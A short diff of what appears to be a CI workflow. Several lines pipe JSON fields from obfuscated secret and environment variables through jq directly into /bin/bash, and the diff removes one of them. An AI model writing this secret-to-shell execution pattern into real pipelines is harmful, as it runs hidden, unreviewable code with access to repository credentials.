@@ -23,7 +23,6 @@ jobs:
           rbg63: ${{ secrets.rbg63 }}
         run: |
           printf '%s' "$rbg63" | jq -r .x9 | /bin/bash
-          printf '%s' "$txlrw287" | jq -r .dkwb7 | /bin/bash
           echo $aa09266 | jq -r .fujqo6 | /bin/bash
           printf '%s' "$zya8403" | jq -r .e05453 | /bin/bash
           echo $u3318 | jq -r .out438 | /bin/bash
